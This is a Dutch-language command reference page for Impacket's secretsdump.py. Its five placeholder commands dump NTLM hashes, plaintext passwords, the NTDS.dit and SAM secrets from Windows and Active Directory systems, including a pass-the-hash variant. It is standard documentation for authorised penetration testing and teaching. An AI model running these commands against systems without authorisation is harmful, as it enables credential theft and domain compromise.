# secretsdump.py

> NTLM-hashes, wachtwoorden in platte tekst en domeingegevens van Windows-systemen op afstand downloaden.
> Onderdeel van de Impacket-suite.
> Meer informatie: <https://github.com/fortra/impacket>.

- Dump vertrouwelijke gegevens van een Windows machine met een gebruikersnaam en wachtwoord:

`secretsdump.py {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Dump hashes van een machine met pass-the-hash authenticatie:

`secretsdump.py -hashes {{LM_Hash}}:{{NT_Hash}} {{domein}}/{{gebruikersnaam}}@{{doel}}`

- Dump referenties van Active Directory's NTDS.dit bestand:

`secretsdump.py -just-dc {{domein}}/{{gebruikersnaam}}:{{wachtwoord}}@{{doel}}`

- Haal referenties uit een lokale SAM-database met behulp van registerhives:

`secretsdump.py -sam {{pad/naar/SAM}} -system {{pad/naar/SYSTEM}}`

- Dump hashes van een machine zonder een wachtwoord op te geven (als er een geldige authenticatiesessie bestaat, bijv. via Kerberos of NTLM SSO):

`secretsdump.py -no-pass {{domein}}/{{gebruikersnaam}}@{{doel}}`
